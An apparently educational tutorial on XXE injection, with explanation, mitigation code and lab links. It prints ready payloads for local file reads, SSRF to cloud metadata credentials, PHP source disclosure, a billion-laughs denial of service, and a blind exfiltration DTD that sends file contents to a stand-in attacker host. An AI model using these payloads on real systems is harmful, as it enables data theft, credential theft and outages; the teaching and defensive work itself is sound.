# What is XXE?

XML External Entity (XXE) injection abuses an XML parser that resolves **external entities**. XML lets a document define entities (like variables) that can pull content from a URI. If the parser is configured to fetch those URIs (the default in many old libraries), an attacker can read local files, reach internal services (SSRF), exfiltrate data out-of-band, or in some setups get code execution.

Anywhere an app accepts XML is worth testing: SOAP APIs, SAML SSO, SVG images, DOCX/XLSX/PPTX files, RSS feeds, and REST endpoints that accept `Content-Type: application/xml`.

## How entities work (the key concept)

```xml
<!DOCTYPE foo [
  <!ENTITY greeting "hello">   <!-- internal entity -->
]>
<data>&greeting;</data>        <!-- expands to: <data>hello</data> -->
```

An **external** entity does the same but fetches the value from a URI:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Now `&xxe;` expands to the contents of `/etc/passwd`. That is the whole bug.

## Impact

- **Read local files** (`/etc/passwd`, source code, config with secrets)
- **SSRF** - reach internal-only services and cloud metadata (`169.254.169.254`)
- **Data exfiltration** even when nothing is reflected (blind, out-of-band)
- **Denial of service** (billion laughs / entity expansion)
- **RCE** in rare cases (PHP `expect://`, misconfigured parsers)

## Step 1 - Classic in-band file read

If the app echoes back any XML field, put your entity in it:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

The response contains the file contents where `<data>` is reflected.

## Step 2 - SSRF via XXE

```xml
<!-- AWS instance metadata (IMDSv1) -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&xxe;</data>

<!-- Internal service -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.1:8080/admin"> ]>
```

## Step 3 - PHP source disclosure (base64 filter)

Reading a PHP file directly breaks XML (the `<?php` tags). Wrap it in a base64 filter:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<data>&xxe;</data>
```

Then base64-decode the response.

## Step 4 - Blind / out-of-band (OOB) exfiltration

When nothing is reflected, host an external DTD on your server and force the parser to fetch it:

Request payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://attacker.oastify.com/evil.dtd"> %ext; ]>
<data>test</data>
```

`evil.dtd` hosted on your server (reads a file and sends it to you in a URL):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

You will see the file contents arrive as the `?x=` parameter in your server/OAST logs. (Parameter entities `%` are used because general entities cannot be nested inside the DTD subset.)

## Step 5 - XXE via file upload (SVG / DOCX)

Many apps parse uploaded SVGs. Upload this as `.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

## Step 6 - Denial of service (billion laughs)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - Repeater plus Collaborator for blind XXE
- [XXEinjector](https://github.com/enjoiz/XXEinjector) - automates file retrieval and OOB
- [interactsh](https://github.com/projectdiscovery/interactsh) - OAST callbacks

## Manual testing checklist

1. Find any endpoint that accepts XML (`Content-Type: application/xml`, SOAP, SAML, file upload).
2. Add a `<!DOCTYPE>` with an entity reading `/etc/passwd` and reference it in a reflected field.
3. If nothing reflects, switch to blind OOB with an external DTD + OAST callback.
4. Try `php://filter` to read source safely.
5. Try SSRF to internal hosts and cloud metadata.

## Mitigation - the fix

**Disable DTDs and external entity resolution** in the parser. This is the real fix.

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Python - use defusedxml instead of the stdlib parser
from defusedxml.ElementTree import parse
```

```php
// PHP < 8.0
libxml_disable_entity_loader(true);
```

Additional defenses:

- Prefer **JSON** over XML where possible
- Use a hardened XML library with secure defaults
- Do not reflect parsed XML back to the user
- Patch SAML/SOAP stacks (common XXE hiding spots)

## Practice

- [PortSwigger XXE labs](https://portswigger.net/web-security/xxe) - covers in-band, blind, and SVG XXE

## Deep dive

- [XXE - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

## CWE

- CWE-611: Improper Restriction of XML External Entity Reference
